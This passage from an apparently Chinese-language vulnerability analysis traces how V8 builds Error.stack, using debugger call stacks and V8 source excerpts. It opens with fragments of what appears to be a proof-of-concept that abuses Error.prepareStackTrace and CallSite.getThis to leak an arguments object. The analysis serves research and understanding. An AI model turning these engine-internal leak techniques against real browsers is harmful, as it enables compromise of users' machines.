<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> () {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">optim</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">z</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">C</span>(<span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">C</span>(<span style="color:#ae81ff">3</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">z</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> {<span style="color:#a6e22e">M</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">z</span>, <span style="color:#a6e22e">C</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">p</span>};
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>C 函数中的 Error().stack 抓到的调用栈应该是下面这样的：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">C</span>()
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">J</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">c</span>()
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">J</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">b</span>()
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">J</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">a</span>()
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">J</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">d</span>()
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">opt</span>()
</span></span></code></pre></div><p>那么 <code>B[z].getThis()</code> 获取到的就是 <code>J.prototype.a</code> 这一层调用的 <code>this</code>，也就是 <code>J.prototype.d</code> 函数中通过 <code>call</code> 函数指定的 <code>arguments</code> 对象, 应该是数组 <code>[1, globalThis.a, 1]</code></p>
<p>在调试器里跟踪一下 <code>Error</code> 对象的相关流程，学习一下 <code>Error</code> 对象的实现。
加入一个 <code>%SystemBreak()</code> 函数调用，让程序在构建调用栈时断下。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>Error.<span style="color:#a6e22e">prepareStackTrace</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>(<span style="color:#a6e22e">t</span>, <span style="color:#a6e22e">B</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#f92672">%</span><span style="color:#a6e22e">SystemBreak</span>();
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">B</span>[<span style="color:#a6e22e">z</span>].<span style="color:#a6e22e">getThis</span>();
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p>得到如下调用栈</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#f92672">&gt;</span>	chrome.dll<span style="color:#f92672">!</span>v8<span style="color:#f92672">::</span>base<span style="color:#f92672">::</span>OS<span style="color:#f92672">::</span>DebugBreak()
</span></span><span style="display:flex;"><span> 	[Inline Frame] chrome.dll<span style="color:#f92672">!</span>v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>__RT_impl_Runtime_SystemBreak(
</span></span><span style="display:flex;"><span> 	chrome.dll<span style="color:#f92672">!</span>v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>Runtime_SystemBreak(<span style="color:#66d9ef">int</span>)
</span></span><span style="display:flex;"><span> 	<span style="color:#ae81ff">00007ff</span>b1fecbcb7()	Unknown
</span></span><span style="display:flex;"><span> 	<span style="color:#ae81ff">00007ff</span>b1ff6d5cb()	Unknown
</span></span><span style="display:flex;"><span> 	<span style="color:#ae81ff">00007ff</span>b1fe4c9e2()	Unknown
</span></span><span style="display:flex;"><span> 	<span style="color:#ae81ff">00007ff</span>b1fe4aa1c()	Unknown
</span></span><span style="display:flex;"><span> 	<span style="color:#ae81ff">00007ff</span>b1fe4a61b()	Unknown
</span></span><span style="display:flex;"><span> 	[Inline Frame] chrome.dll<span style="color:#f92672">!</span>v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>GeneratedCode<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>,<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>,<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>,<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>,<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>,<span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>,<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> <span style="color:#f92672">**&gt;::</span>Call(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>) Line <span style="color:#ae81ff">156</span>	C<span style="color:#f92672">++</span>
</span></span><span style="display:flex;"><span> 	chrome.dll<span style="color:#f92672">!</span>v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span><span style="color:#960050;background-color:#1e0010">`</span>anonymous <span style="color:#66d9ef">namespace</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">::</span>Invoke(
</span></span><span style="display:flex;"><span> 	chrome.dll<span style="color:#f92672">!</span>v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>Execution<span style="color:#f92672">::</span>Call(
</span></span><span style="display:flex;"><span> 	chrome.dll<span style="color:#f92672">!</span>v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>ErrorUtils<span style="color:#f92672">::</span>FormatStackTrace(
</span></span><span style="display:flex;"><span> 	chrome.dll<span style="color:#f92672">!</span>v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>ErrorUtils<span style="color:#f92672">::</span>GetFormattedStack(
</span></span><span style="display:flex;"><span> 	chrome.dll<span style="color:#f92672">!</span>v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>Accessors<span style="color:#f92672">::</span>ErrorStackGetter(v8<span style="color:#f92672">::</span>Local<span style="color:#f92672">&lt;</span>v8<span style="color:#f92672">::</span>Name<span style="color:#f92672">&gt;</span>) 
</span></span><span style="display:flex;"><span> 	[Inline Frame] chrome.dll<span style="color:#f92672">!</span>v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>PropertyCallbackArguments<span style="color:#f92672">::</span>BasicCallNamedGetterCallback(
</span></span><span style="display:flex;"><span> 	chrome.dll<span style="color:#f92672">!</span>v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>PropertyCallbackArguments<span style="color:#f92672">::</span>CallAccessorGetter(
</span></span><span style="display:flex;"><span> 	chrome.dll<span style="color:#f92672">!</span>v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>Object<span style="color:#f92672">::</span>GetPropertyWithAccessor()
</span></span><span style="display:flex;"><span> 	chrome.dll<span style="color:#f92672">!</span>v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>Object<span style="color:#f92672">::</span>GetProperty(<span style="color:#66d9ef">bool</span>)
</span></span><span style="display:flex;"><span> 	chrome.dll<span style="color:#f92672">!</span>v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>LoadIC<span style="color:#f92672">::</span>Load(v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>Handle<span style="color:#f92672">&lt;</span>v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>Object<span style="color:#f92672">&gt;</span>) 
</span></span><span style="display:flex;"><span> 	[Inline Frame] chrome.dll<span style="color:#f92672">!</span>v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>__RT_impl_Runtime_LoadNoFeedbackIC_Miss(
</span></span><span style="display:flex;"><span> 	chrome.dll<span style="color:#f92672">!</span>v8<span style="color:#f92672">::</span>internal<span style="color:#f92672">::</span>Runtime_LoadNoFeedbackIC_Miss(<span style="color:#66d9ef">int</span>)
</span></span><span style="display:flex;"><span> 	...
</span></span></code></pre></div><p>可以看出 <code>Error.stack</code> 属性是一个 <code>accessor</code>，对这个属性的访问，触发了对应了 <code>ErrorStackGetter</code> 函数的执行，继续浏览调用栈，可以看到一个 <code>FormatStackTrace</code> 函数，这个函数的实现跟之前读到的文档的内容可以匹配上，程序先创建了一个 <code>CallSite</code> 对象的数组，然后用这个数组作为参数，调用了 <code>prepareStackTrace</code> 函数。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">// static
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>MaybeHandle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> ErrorUtils<span style="color:#f92672">::</span>GetFormattedStack(
</span></span><span style="display:flex;"><span>    Isolate<span style="color:#f92672">*</span> isolate, Handle<span style="color:#f92672">&lt;</span>JSObject<span style="color:#f92672">&gt;</span> error_object) {
</span></span><span style="display:flex;"><span>  TRACE_EVENT0(TRACE_DISABLED_BY_DEFAULT(<span style="color:#e6db74">&#34;v8.stack_trace&#34;</span>), __func__);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> error_stack <span style="color:#f92672">=</span> JSReceiver<span style="color:#f92672">::</span>GetDataProperty(
</span></span><span style="display:flex;"><span>      error_object, isolate<span style="color:#f92672">-&gt;</span>factory()<span style="color:#f92672">-&gt;</span>error_stack_symbol());
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (error_stack<span style="color:#f92672">-&gt;</span>IsErrorStackData()) {
</span></span><span style="display:flex;"><span>    ....
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> formatted_stack;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (error_stack<span style="color:#f92672">-&gt;</span>IsFixedArray()) {
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">///&gt;&gt;&gt;&gt; 程序走到这里
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> formatted_stack;
</span></span><span style="display:flex;"><span>    ASSIGN_RETURN_ON_EXCEPTION(
</span></span><span style="display:flex;"><span>        isolate, formatted_stack,
</span></span><span style="display:flex;"><span>        FormatStackTrace(isolate, error_object,
</span></span><span style="display:flex;"><span>                         Handle<span style="color:#f92672">&lt;</span>FixedArray<span style="color:#f92672">&gt;::</span>cast(error_stack)),
</span></span><span style="display:flex;"><span>        Object);
</span></span><span style="display:flex;"><span>    RETURN_ON_EXCEPTION(
</span></span><span style="display:flex;"><span>        isolate,
</span></span><span style="display:flex;"><span>        JSObject<span style="color:#f92672">::</span>SetProperty(isolate, error_object,
</span></span><span style="display:flex;"><span>                              isolate<span style="color:#f92672">-&gt;</span>factory()<span style="color:#f92672">-&gt;</span>error_stack_symbol(),
</span></span><span style="display:flex;"><span>                              formatted_stack, StoreOrigin<span style="color:#f92672">::</span>kMaybeKeyed,
</span></span><span style="display:flex;"><span>                              Just(ShouldThrow<span style="color:#f92672">::</span>kThrowOnError)),
</span></span><span style="display:flex;"><span>        Object);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> formatted_stack;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> error_stack;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// static
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>MaybeHandle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> ErrorUtils<span style="color:#f92672">::</span>FormatStackTrace(Isolate<span style="color:#f92672">*</span> isolate,
</span></span><span style="display:flex;"><span>                                                 Handle<span style="color:#f92672">&lt;</span>JSObject<span style="color:#f92672">&gt;</span> error,
</span></span><span style="display:flex;"><span>                                                 Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> raw_stack) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (FLAG_correctness_fuzzer_suppressions) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> isolate<span style="color:#f92672">-&gt;</span>factory()<span style="color:#f92672">-&gt;</span>empty_string();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  DCHECK(raw_stack<span style="color:#f92672">-&gt;</span>IsFixedArray());
</span></span><span style="display:flex;"><span>  Handle<span style="color:#f92672">&lt;</span>FixedArray<span style="color:#f92672">&gt;</span> elems <span style="color:#f92672">=</span> Handle<span style="color:#f92672">&lt;</span>FixedArray<span style="color:#f92672">&gt;::</span>cast(raw_stack);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">bool</span> in_recursion <span style="color:#f92672">=</span> isolate<span style="color:#f92672">-&gt;</span>formatting_stack_trace();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">bool</span> has_overflowed <span style="color:#f92672">=</span> i<span style="color:#f92672">::</span>StackLimitCheck{isolate}.HasOverflowed();
</span></span><span style="display:flex;"><span>  Handle<span style="color:#f92672">&lt;</span>Context<span style="color:#f92672">&gt;</span> error_context;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>in_recursion <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>has_overflowed <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>      error<span style="color:#f92672">-&gt;</span>GetCreationContext().ToHandle(<span style="color:#f92672">&amp;</span>error_context)) {
</span></span><span style="display:flex;"><span>    DCHECK(error_context<span style="color:#f92672">-&gt;</span>IsNativeContext());
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (isolate<span style="color:#f92672">-&gt;</span>HasPrepareStackTraceCallback()) {
</span></span><span style="display:flex;"><span>      ...
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      Handle<span style="color:#f92672">&lt;</span>JSFunction<span style="color:#f92672">&gt;</span> global_error <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>          handle(error_context<span style="color:#f92672">-&gt;</span>error_function(), isolate);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// If there&#39;s a user-specified &#34;prepareStackTrace&#34; function, call it on
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// the frames and use its result.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>      Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> prepare_stack_trace;
</span></span><span style="display:flex;"><span>      ASSIGN_RETURN_ON_EXCEPTION(
</span></span><span style="display:flex;"><span>          isolate, prepare_stack_trace,
</span></span><span style="display:flex;"><span>          JSFunction<span style="color:#f92672">::</span>GetProperty(isolate, global_error, <span style="color:#e6db74">&#34;prepareStackTrace&#34;</span>),
</span></span><span style="display:flex;"><span>          Object);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (prepare_stack_trace<span style="color:#f92672">-&gt;</span>IsJSFunction()) {
</span></span><span style="display:flex;"><span>        PrepareStackTraceScope <span style="color:#a6e22e">scope</span>(isolate);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        isolate<span style="color:#f92672">-&gt;</span>CountUsage(v8<span style="color:#f92672">::</span>Isolate<span style="color:#f92672">::</span>kErrorPrepareStackTrace);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Handle<span style="color:#f92672">&lt;</span>JSArray<span style="color:#f92672">&gt;</span> sites;
</span></span><span style="display:flex;"><span>        ASSIGN_RETURN_ON_EXCEPTION(isolate, sites,
</span></span><span style="display:flex;"><span>                                   GetStackFrames(isolate, elems), Object);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">int</span> argc <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>;
</span></span><span style="display:flex;"><span>        base<span style="color:#f92672">::</span>ScopedVector<span style="color:#f92672">&lt;</span>Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;&gt;</span> argv(argc);
</span></span><span style="display:flex;"><span>        argv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> error;
</span></span><span style="display:flex;"><span>        argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> sites;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> result;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ASSIGN_RETURN_ON_EXCEPTION(
</span></span><span style="display:flex;"><span>            isolate, result,
</span></span><span style="display:flex;"><span>            Execution<span style="color:#f92672">::</span>Call(isolate, prepare_stack_trace, global_error, argc,
</span></span><span style="display:flex;"><span>                            argv.begin()),
</span></span><span style="display:flex;"><span>            Object);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Otherwise, run our internal formatting logic.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  ...
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// Convert the raw frames as written by Isolate::CaptureSimpleStackTrace into
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// a JSArray of JSCallSite objects.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>MaybeHandle<span style="color:#f92672">&lt;</span>JSArray<span style="color:#f92672">&gt;</span> GetStackFrames(Isolate<span style="color:#f92672">*</span> isolate,
</span></span><span style="display:flex;"><span>                                    Handle<span style="color:#f92672">&lt;</span>FixedArray<span style="color:#f92672">&gt;</span> frames) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> frame_count <span style="color:#f92672">=</span> frames<span style="color:#f92672">-&gt;</span>length();
</span></span><span style="display:flex;"><span>  Handle<span style="color:#f92672">&lt;</span>JSFunction<span style="color:#f92672">&gt;</span> constructor <span style="color:#f92672">=</span> isolate<span style="color:#f92672">-&gt;</span>callsite_function();
</span></span><span style="display:flex;"><span>  Handle<span style="color:#f92672">&lt;</span>FixedArray<span style="color:#f92672">&gt;</span> sites <span style="color:#f92672">=</span> isolate<span style="color:#f92672">-&gt;</span>factory()<span style="color:#f92672">-&gt;</span>NewFixedArray(frame_count);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> frame_count; <span style="color:#f92672">++</span>i) {
</span></span><span style="display:flex;"><span>    Handle<span style="color:#f92672">&lt;</span>CallSiteInfo<span style="color:#f92672">&gt;</span> frame(CallSiteInfo<span style="color:#f92672">::</span>cast(frames<span style="color:#f92672">-&gt;</span>get(i)), isolate);
</span></span><span style="display:flex;"><span>    Handle<span style="color:#f92672">&lt;</span>JSObject<span style="color:#f92672">&gt;</span> site;
</span></span><span style="display:flex;"><span>    ASSIGN_RETURN_ON_EXCEPTION(
</span></span><span style="display:flex;"><span>        isolate, site,
</span></span><span style="display:flex;"><span>        JSObject<span style="color:#f92672">::</span>New(constructor, constructor, Handle<span style="color:#f92672">&lt;</span>AllocationSite<span style="color:#f92672">&gt;::</span>null()),
</span></span><span style="display:flex;"><span>        JSArray);
</span></span><span style="display:flex;"><span>    RETURN_ON_EXCEPTION(isolate,
</span></span><span style="display:flex;"><span>                        JSObject<span style="color:#f92672">::</span>SetOwnPropertyIgnoreAttributes(
</span></span><span style="display:flex;"><span>                            site, isolate<span style="color:#f92672">-&gt;</span>factory()<span style="color:#f92672">-&gt;</span>call_site_info_symbol(),
</span></span><span style="display:flex;"><span>                            frame, DONT_ENUM),
</span></span><span style="display:flex;"><span>                        JSArray);
</span></span><span style="display:flex;"><span>    sites<span style="color:#f92672">-&gt;</span>set(i, <span style="color:#f92672">*</span>site);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> isolate<span style="color:#f92672">-&gt;</span>factory()<span style="color:#f92672">-&gt;</span>NewJSArrayWithElements(sites);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>在代码中搜索 callsie 关键字，可以搜到 getThis 的 CPP 实现 BUILTIN(CallSitePrototypeGetThis)。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-CPP" data-lang="CPP"><span style="display:flex;"><span>BUILTIN(CallSitePrototypeGetThis) {
</span></span><span style="display:flex;"><span>  HandleScope <span style="color:#a6e22e">scope</span>(isolate);
</span></span><span style="display:flex;"><span>  CHECK_CALLSITE(frame, <span style="color:#e6db74">&#34;getThis&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (frame<span style="color:#f92672">-&gt;</span>IsStrict()) <span style="color:#66d9ef">return</span> ReadOnlyRoots(isolate).undefined_value();
</span></span><span style="display:flex;"><span>  isolate<span style="color:#f92672">-&gt;</span>CountUsage(v8<span style="color:#f92672">::</span>Isolate<span style="color:#f92672">::</span>kCallSiteAPIGetThisSloppyCall);
</span></span><span style="display:flex;"><span><span style="color:#75715e">#if V8_ENABLE_WEBASSEMBLY
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> (frame<span style="color:#f92672">-&gt;</span>IsAsmJsWasm()) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> frame<span style="color:#f92672">-&gt;</span>GetWasmInstance().native_context().global_proxy();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#75715e">#endif  </span><span style="color:#75715e">// V8_ENABLE_WEBASSEMBLY
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">return</span> frame<span style="color:#f92672">-&gt;</span>receiver_or_instance();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define CHECK_CALLSITE(frame, method)                                         \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  CHECK_RECEIVER(JSObject, receiver, method);                                 \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  LookupIterator it(isolate, receiver,                                        \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                    isolate-&gt;factory()-&gt;call_site_info_symbol(),              \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                    LookupIterator::OWN_SKIP_INTERCEPTOR);                    \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  if (it.state() != LookupIterator::DATA) {                                   \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    THROW_NEW_ERROR_RETURN_FAILURE(                                           \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        isolate,                                                              \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        NewTypeError(MessageTemplate::kCallSiteMethod,                        \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                     isolate-&gt;factory()-&gt;NewStringFromAsciiChecked(method))); \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  }                                                                           \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  Handle&lt;CallSiteInfo&gt; frame = Handle&lt;CallSiteInfo&gt;::cast(it.GetDataValue())
</span></span></span></code></pre></div><p>可以看到 getThis 就是读取了存储在 CallSizeInfo 对象中的 receiver 数据， 往前追溯 CallSiteInfo 的来源，发现是 <code>JSReceiver::GetDataProperty(error_object, isolate-&gt;factory()-&gt;error_stack_symbol());</code> 语句读取的，在代码中搜索 error_stack_symbol 关键字，找到疑似设置属性的函数 <code>Isolate::CaptureAndSetErrorStack</code>， 下断点后刷新页面，断点断下，检查调用栈可以看到是 error 对象的构造函数中调用了此函数采集调用栈信息。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>MaybeHandle<span style="color:#f92672">&lt;</span>JSObject<span style="color:#f92672">&gt;</span> Isolate<span style="color:#f92672">::</span>CaptureAndSetErrorStack(
</span></span><span style="display:flex;"><span>    Handle<span style="color:#f92672">&lt;</span>JSObject<span style="color:#f92672">&gt;</span> error_object, FrameSkipMode mode, Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> caller) {
</span></span><span style="display:flex;"><span>  TRACE_EVENT0(TRACE_DISABLED_BY_DEFAULT(<span style="color:#e6db74">&#34;v8.stack_trace&#34;</span>), __func__);
</span></span><span style="display:flex;"><span>  Handle<span style="color:#f92672">&lt;</span>Object<span style="color:#f92672">&gt;</span> error_stack <span style="color:#f92672">=</span> factory()<span style="color:#f92672">-&gt;</span>undefined_value();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Capture the &#34;simple stack trace&#34; for the error.stack property,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// which can be disabled by setting Error.stackTraceLimit to a non
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// number value or simply deleting the property. If the inspector
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// is active, and requests more stack frames than the JavaScript
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#75715e">// program itself, we collect up to the maximum.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> stack_trace_limit <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (GetStackTraceLimit(<span style="color:#66d9ef">this</span>, <span style="color:#f92672">&amp;</span>stack_trace_limit)) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> limit <span style="color:#f92672">=</span> stack_trace_limit;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (capture_stack_trace_for_uncaught_exceptions_ <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">!</span>(stack_trace_for_uncaught_exceptions_options_ <span style="color:#f92672">&amp;</span>
</span></span><span style="display:flex;"><span>          StackTrace<span style="color:#f92672">::</span>kExposeFramesAcrossSecurityOrigins)) {
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// Collect up to the maximum of what the JavaScript program and
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// the inspector want. There&#39;s a special case here where the API
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// can ask the stack traces to also include cross-origin frames,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// in which case we collect a separate trace below. Note that
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// the inspector doesn&#39;t use this option, so we could as well
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#75715e">// just deprecate this in the future.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span> (limit <span style="color:#f92672">&lt;</span> stack_trace_for_uncaught_exceptions_frame_limit_) {
</span></span><span style="display:flex;"><span>        limit <span style="color:#f92672">=</span> stack_trace_for_uncaught_exceptions_frame_limit_;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
